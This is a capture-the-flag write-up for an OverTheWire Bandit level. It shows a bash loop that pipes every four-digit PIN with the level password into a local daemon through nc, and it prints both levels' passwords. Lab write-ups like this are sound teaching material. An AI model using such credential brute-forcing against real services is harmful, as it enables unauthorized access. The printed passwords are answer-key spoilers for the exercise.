# Bandit Level 24 → Level 25

Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

You do not need to create new connections each time


```bash
# trying the deamon, and seeing that it requires the password for bandit24 and a 4-digit pincode
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
Wrong! Please enter the correct current password and pincode. Try again.

Wrong! Please enter the correct current password and pincode. Try again.
^C

# storing HOST, PORT and PASS in variables 
bandit24@bandit:~$ HOST=localhost
PORT=30002
PASS='gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'

# using a for loop to try PASS + all possible 4-digit pincodes
# printing only the correct output by filtering out the "Wrong!" responses with grep
bandit24@bandit:~$ for pin in {0000..9999}; do
> echo "$PASS $pin"
> done | nc "$HOST" "$PORT" | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4



```





HOST=localhost
PORT=30002
PASS='gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'

for pin in {0000..9999}; do
  echo "$PASS $pin"
done | nc "$HOST" "$PORT" | grep -v "Wrong"